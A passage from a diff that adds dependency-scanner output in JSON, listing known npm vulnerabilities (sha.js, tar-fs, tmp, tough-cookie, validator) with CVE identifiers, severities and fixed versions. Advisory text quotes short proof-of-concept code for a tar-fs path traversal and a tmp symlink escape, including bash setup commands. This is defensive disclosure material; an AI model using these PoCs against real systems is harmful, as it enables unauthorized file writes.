+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/browserify/sha.js/pull/78"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/browserify/sha.js/commit/f2a258e9f2d0fcd113bfbaa49706e1ac0d979ba5"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/browserify/sha.js"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://www.cve.org/CVERecord?id=CVE-2025-9287"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-20"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-08-21T14:47:55Z",
+                "nvd_published_at": "2025-08-20T22:15:30Z",
+                "severity": "CRITICAL"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-95m3-7q98-8xr5"
+              ],
+              "aliases": [
+                "CVE-2025-9288",
+                "GHSA-95m3-7q98-8xr5"
+              ],
+              "max_severity": "9.1"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "tar-fs",
+            "version": "2.1.1",
+            "ecosystem": "npm"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2025-08-14T19:26:16Z",
+              "published": "2025-06-03T06:14:25Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-8cj5-5rvv-wf4v",
+              "aliases": [
+                "CVE-2025-48387"
+              ],
+              "related": [
+                "CGA-55w6-xh69-4x9r",
+                "CGA-pf8m-56wg-hmgj",
+                "CGA-rwrq-vpx6-923w",
+                "CVE-2025-48387"
+              ],
+              "summary": "tar-fs can extract outside the specified dir with a specific tarball",
+              "details": "### Impact\n v3.0.8, v2.1.2, v1.16.4 and below\n\n### Patches\nHas been patched in 3.0.9, 2.1.3, and 1.16.5\n\n### Workarounds\nYou can use the ignore option to ignore non files/directories.\n\n```js\n  ignore (_, header) {\n    // pass files \u0026 directories, ignore e.g. symlinks\n    return header.type !== 'file' \u0026\u0026 header.type !== 'directory'\n  }\n```\n\n### Credit\nThank you Caleb Brown from Google Open Source Security Team for reporting this in detail.",
+              "severity": [
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.16.5"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-8cj5-5rvv-wf4v/GHSA-8cj5-5rvv-wf4v.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "2.1.3"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-8cj5-5rvv-wf4v/GHSA-8cj5-5rvv-wf4v.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.0.9"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-8cj5-5rvv-wf4v/GHSA-8cj5-5rvv-wf4v.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/google/security-research/security/advisories/GHSA-xrg4-qp5w-2c3w"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/mafintosh/tar-fs/security/advisories/GHSA-8cj5-5rvv-wf4v"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-48387"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/mafintosh/tar-fs/commit/647447b572bc135c41035e82ca7b894f02b17f0f"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/mafintosh/tar-fs"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-22"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-06-03T06:14:25Z",
+                "nvd_published_at": "2025-06-02T20:15:22Z",
+                "severity": "HIGH"
+              }
+            },
+            {
+              "modified": "2025-09-29T16:38:27Z",
+              "published": "2025-03-27T18:31:28Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-pq67-2wwv-3xjx",
+              "aliases": [
+                "CVE-2024-12905"
+              ],
+              "related": [
+                "CGA-35gc-2rvw-x3vx",
+                "CGA-g3wm-3ppv-6g8v",
+                "CGA-r9fv-hjfx-7q5f",
+                "CGA-vpjj-p9g3-27hp"
+              ],
+              "summary": "tar-fs Vulnerable to Link Following and Path Traversal via Extracting a Crafted tar File",
+              "details": "An Improper Link Resolution Before File Access (\"Link Following\") and Improper Limitation of a Pathname to a Restricted Directory (\"Path Traversal\"). This vulnerability occurs when extracting a maliciously crafted tar file, which can result in unauthorized file writes or overwrites outside the intended extraction directory. The issue is associated with index.js in the tar-fs package.\n\nThis issue affects tar-fs: from 0.0.0 before 1.16.4, from 2.0.0 before 2.1.2, from 3.0.0 before 3.0.7.\n\n### PoC\n```javascript\n// Create a writable stream to extract the tar content\nconst extractStream = tarfs.extract('/', {\n    // We can ignore the file type checks to allow the extraction of the malicious file\n    ignore: (name) =\u003e false,\n});\n\n// Create a tar stream\nconst tarStream = tarfs.pack().on('error', (err) =\u003e {\n    throw err;\n});\n\n// Append the malicious entry to the tar stream\ntarStream.entry({ name: '/flag.txt', mode: 0o644 }, Buffer.from('This is a flag!'));\n\n// Finalize the tar stream\ntarStream.finalize();\n\n// Pipe the tar stream into the extract stream\ntarStream.pipe(extractStream);\n```",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.16.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-pq67-2wwv-3xjx/GHSA-pq67-2wwv-3xjx.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "2.1.2"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-pq67-2wwv-3xjx/GHSA-pq67-2wwv-3xjx.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.0.7"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-pq67-2wwv-3xjx/GHSA-pq67-2wwv-3xjx.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-12905"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://arxiv.org/abs/2506.04962"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://arxiv.org/pdf/2506.04962"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/mafintosh/tar-fs"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-22"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-03-28T22:11:42Z",
+                "nvd_published_at": "2025-03-27T17:15:53Z",
+                "severity": "HIGH"
+              }
+            },
+            {
+              "modified": "2025-09-26T17:24:25Z",
+              "published": "2025-09-24T18:57:04Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-vj76-c3g6-qr5v",
+              "aliases": [
+                "CVE-2025-59343"
+              ],
+              "related": [
+                "CGA-3xxp-rpv6-8q3v",
+                "CGA-629w-fchm-c48f",
+                "CGA-9rx8-9xvv-cx6w",
+                "CGA-jjrf-7cgq-346h",
+                "CGA-x8c2-72cm-877v"
+              ],
+              "summary": "tar-fs has a symlink validation bypass if destination directory is predictable with a specific tarball",
+              "details": "### Impact\n v3.1.0, v2.1.3, v1.16.5 and below\n\n### Patches\nHas been patched in 3.1.1, 2.1.4, and 1.16.6\n\n### Workarounds\nYou can use the ignore option to ignore non files/directories.\n\n```js\n  ignore (_, header) {\n    // pass files \u0026 directories, ignore e.g. symlinks\n    return header.type !== 'file' \u0026\u0026 header.type !== 'directory'\n  }\n```\n\n### Credit\nReported by: Mapta / BugBunny_ai",
+              "severity": [
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.1.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-vj76-c3g6-qr5v/GHSA-vj76-c3g6-qr5v.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "2.1.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-vj76-c3g6-qr5v/GHSA-vj76-c3g6-qr5v.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.16.6"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-vj76-c3g6-qr5v/GHSA-vj76-c3g6-qr5v.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/mafintosh/tar-fs/security/advisories/GHSA-vj76-c3g6-qr5v"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-59343"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/mafintosh/tar-fs/commit/0bd54cdf06da2b7b5b95cd4b062c9f4e0a8c4e09"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/mafintosh/tar-fs"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-22",
+                  "CWE-61"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-09-24T18:57:04Z",
+                "nvd_published_at": "2025-09-24T18:15:42Z",
+                "severity": "HIGH"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-8cj5-5rvv-wf4v"
+              ],
+              "aliases": [
+                "CVE-2025-48387",
+                "GHSA-8cj5-5rvv-wf4v"
+              ],
+              "max_severity": "8.7"
+            },
+            {
+              "ids": [
+                "GHSA-pq67-2wwv-3xjx"
+              ],
+              "aliases": [
+                "CVE-2024-12905",
+                "GHSA-pq67-2wwv-3xjx"
+              ],
+              "max_severity": "7.5"
+            },
+            {
+              "ids": [
+                "GHSA-vj76-c3g6-qr5v"
+              ],
+              "aliases": [
+                "CVE-2025-59343",
+                "GHSA-vj76-c3g6-qr5v"
+              ],
+              "max_severity": "8.7"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "tar-fs",
+            "version": "2.1.3",
+            "ecosystem": "npm"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2025-09-26T17:24:25Z",
+              "published": "2025-09-24T18:57:04Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-vj76-c3g6-qr5v",
+              "aliases": [
+                "CVE-2025-59343"
+              ],
+              "related": [
+                "CGA-3xxp-rpv6-8q3v",
+                "CGA-629w-fchm-c48f",
+                "CGA-9rx8-9xvv-cx6w",
+                "CGA-jjrf-7cgq-346h",
+                "CGA-x8c2-72cm-877v"
+              ],
+              "summary": "tar-fs has a symlink validation bypass if destination directory is predictable with a specific tarball",
+              "details": "### Impact\n v3.1.0, v2.1.3, v1.16.5 and below\n\n### Patches\nHas been patched in 3.1.1, 2.1.4, and 1.16.6\n\n### Workarounds\nYou can use the ignore option to ignore non files/directories.\n\n```js\n  ignore (_, header) {\n    // pass files \u0026 directories, ignore e.g. symlinks\n    return header.type !== 'file' \u0026\u0026 header.type !== 'directory'\n  }\n```\n\n### Credit\nReported by: Mapta / BugBunny_ai",
+              "severity": [
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.1.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-vj76-c3g6-qr5v/GHSA-vj76-c3g6-qr5v.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "2.1.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-vj76-c3g6-qr5v/GHSA-vj76-c3g6-qr5v.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.16.6"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-vj76-c3g6-qr5v/GHSA-vj76-c3g6-qr5v.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/mafintosh/tar-fs/security/advisories/GHSA-vj76-c3g6-qr5v"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-59343"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/mafintosh/tar-fs/commit/0bd54cdf06da2b7b5b95cd4b062c9f4e0a8c4e09"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/mafintosh/tar-fs"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-22",
+                  "CWE-61"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-09-24T18:57:04Z",
+                "nvd_published_at": "2025-09-24T18:15:42Z",
+                "severity": "HIGH"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-vj76-c3g6-qr5v"
+              ],
+              "aliases": [
+                "CVE-2025-59343",
+                "GHSA-vj76-c3g6-qr5v"
+              ],
+              "max_severity": "8.7"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "tmp",
+            "version": "0.0.33",
+            "ecosystem": "npm"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2025-08-07T15:11:22Z",
+              "published": "2025-08-06T17:06:04Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-52f5-9888-hmc6",
+              "aliases": [
+                "CVE-2025-54798"
+              ],
+              "related": [
+                "CGA-24xq-h2j3-3x86",
+                "CGA-6p3x-59vm-9fq8",
+                "CVE-2025-54798"
+              ],
+              "summary": "tmp allows arbitrary temporary file / directory write via symbolic link `dir` parameter",
+              "details": "### Summary\n\n`tmp@0.2.3` is vulnerable to an Arbitrary temporary file / directory write via symbolic link `dir` parameter.\n\n\n### Details\n\nAccording to the documentation there are some conditions that must be held:\n\n```\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L41-L50\n\nOther breaking changes, i.e.\n\n- template must be relative to tmpdir\n- name must be relative to tmpdir\n- dir option must be relative to tmpdir //\u003c-- this assumption can be bypassed using symlinks\n\nare still in place.\n\nIn order to override the system's tmpdir, you will have to use the newly\nintroduced tmpdir option.\n\n\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L375\n* `dir`: the optional temporary directory that must be relative to the system's default temporary directory.\n     absolute paths are fine as long as they point to a location under the system's default temporary directory.\n     Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, \n     as tmp will not check the availability of the path, nor will it establish the requested path for you.\n```\n\nRelated issue: https://github.com/raszi/node-tmp/issues/207.\n\n\nThe issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579\nfunction _resolvePath(name, tmpDir) {\n  if (name.startsWith(tmpDir)) {\n    return path.resolve(name);\n  } else {\n    return path.resolve(path.join(tmpDir, name));\n  }\n}\n```\n\nIf the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609\nfunction _assertIsRelative(name, option, tmpDir) {\n  if (option === 'name') {\n    // assert that name is not absolute and does not contain a path\n    if (path.isAbsolute(name))\n      throw new Error(`${option} option must not contain an absolute path, found \"${name}\".`);\n    // must not fail on valid .\u003cname\u003e or ..\u003cname\u003e or similar such constructs\n    let basename = path.basename(name);\n    if (basename === '..' || basename === '.' || basename !== name)\n      throw new Error(`${option} option must not contain a path, found \"${name}\".`);\n  }\n  else { // if (option === 'dir' || option === 'template') {\n    // assert that dir or template are relative to tmpDir\n    if (path.isAbsolute(name) \u0026\u0026 !name.startsWith(tmpDir)) {\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${name}\".`);\n    }\n    let resolvedPath = _resolvePath(name, tmpDir); //\u003c--- \n    if (!resolvedPath.startsWith(tmpDir))\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${resolvedPath}\".`);\n  }\n}\n```\n\n\n### PoC\n\nThe following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible.\nTested on a Linux machine.\n\n- Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it\n```bash\nmkdir $HOME/mydir1\n\nln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir\n```\n\n- check the folder is empty:\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n```\n\n- run the poc\n```bash\nnode main.js\nFile:  /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf\ntest 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]'\ntest 2: dir option must be relative to \"/tmp\", found \"/foo\".\ntest 3: dir option must be relative to \"/tmp\", found \"/home/user/mydir1\".\n```\n\n- the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`):\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n-rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id]\n```\n\n\n- `main.js`\n```js\n// npm i tmp@0.2.3\n\nconst tmp = require('tmp');\n\nconst tmpobj = tmp.fileSync({ 'dir': 'evil-dir'});\nconsole.log('File: ', tmpobj.name);\n\ntry {\n    tmp.fileSync({ 'dir': 'mydir1'});\n} catch (err) {\n    console.log('test 1:', err.message)\n}\n\ntry {\n    tmp.fileSync({ 'dir': '/foo'});\n} catch (err) {\n    console.log('test 2:', err.message)\n}\n\ntry {\n    const fs = require('node:fs');\n    const resolved = fs.realpathSync('/tmp/evil-dir');\n    tmp.fileSync({ 'dir': resolved});\n} catch (err) {\n    console.log('test 3:', err.message)\n}\n```\n\n\nA Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links.\n```js\nfunction _resolvePath(name, tmpDir) {\n  let resolvedPath;\n  if (name.startsWith(tmpDir)) {\n    resolvedPath = path.resolve(name);\n  } else {\n    resolvedPath = path.resolve(path.join(tmpDir, name));\n  }\n  return fs.realpathSync(resolvedPath);\n}\n```\n\n\n### Impact\n\nArbitrary temporary file / directory write via symlink",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tmp",
+                    "purl": "pkg:npm/tmp"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.2.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 0.2.3",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-52f5-9888-hmc6/GHSA-52f5-9888-hmc6.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/raszi/node-tmp/security/advisories/GHSA-52f5-9888-hmc6"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-54798"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/raszi/node-tmp/issues/207"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/raszi/node-tmp/commit/188b25e529496e37adaf1a1d9dccb40019a08b1b"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/raszi/node-tmp"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-59"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-08-06T17:06:04Z",
+                "nvd_published_at": "2025-08-07T01:15:26Z",
+                "severity": "LOW"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-52f5-9888-hmc6"
+              ],
+              "aliases": [
+                "CVE-2025-54798",
+                "GHSA-52f5-9888-hmc6"
+              ],
+              "max_severity": "2.5"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "tough-cookie",
+            "version": "2.5.0",
+            "ecosystem": "npm"
+          },
+          "dependency_groups": [
+            "dev"
+          ],
+          "vulnerabilities": [
+            {
+              "modified": "2024-06-21T21:33:53Z",
+              "published": "2023-07-01T06:30:16Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-72xf-g2v4-qvf3",
+              "aliases": [
+                "CVE-2023-26136"
+              ],
+              "related": [
+                "CGA-hf6q-478m-mm8p"
+              ],
+              "summary": "tough-cookie Prototype Pollution vulnerability",
+              "details": "Versions of the package tough-cookie before 4.1.3 are vulnerable to Prototype Pollution due to improper handling of Cookies when using CookieJar in `rejectPublicSuffixes=false` mode. This issue arises from the manner in which the objects are initialized.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tough-cookie",
+                    "purl": "pkg:npm/tough-cookie"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "4.1.3"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/07/GHSA-72xf-g2v4-qvf3/GHSA-72xf-g2v4-qvf3.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-26136"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/salesforce/tough-cookie/issues/282"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/salesforce/tough-cookie/commit/12d474791bb856004e858fdb1c47b7608d09cf6e"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/salesforce/tough-cookie"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/salesforce/tough-cookie/releases/tag/v4.1.3"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.debian.org/debian-lts-announce/2023/07/msg00010.html"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3HUE6ZR5SL73KHL7XUPAOEL6SB7HUDT2"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6PVVPNSAGSDS63HQ74PJ7MZ3MU5IYNVZ"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://security.netapp.com/advisory/ntap-20240621-0006"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://security.snyk.io/vuln/SNYK-JS-TOUGHCOOKIE-5672873"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1321"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2023-07-07T21:39:57Z",
+                "nvd_published_at": "2023-07-01T05:15:16Z",
+                "severity": "MODERATE"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-72xf-g2v4-qvf3"
+              ],
+              "aliases": [
+                "CVE-2023-26136",
+                "GHSA-72xf-g2v4-qvf3"
+              ],
+              "max_severity": "6.5"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "validator",
+            "version": "13.15.15",
+            "ecosystem": "npm"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2025-10-13T20:42:25Z",
+              "published": "2025-09-30T18:30:25Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-9965-vmph-33xx",
+              "aliases": [
+                "CVE-2025-56200"
+              ],
+              "summary": "validator.js has a URL validation bypass vulnerability in its isURL function",
+              "details": "A URL validation bypass vulnerability exists in validator.js through version 13.15.15. The isURL() function uses '://' as a delimiter to parse protocols, while browsers use ':' as the delimiter. This parsing difference allows attackers to bypass protocol and domain validation by crafting URLs leading to XSS and Open Redirect attacks.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "validator",
+                    "purl": "pkg:npm/validator"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "last_affected": "13.15.15"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-9965-vmph-33xx/GHSA-9965-vmph-33xx.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-56200"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/validatorjs/validator.js/issues/2600"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://gist.github.com/junan-98/27ae092aa40e2a057d41a0f95148f666"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://gist.github.com/junan-98/a93130505b258b9e4ec9f393e7533596"
+                },
+                {
+                  "type": "PACKAGE",
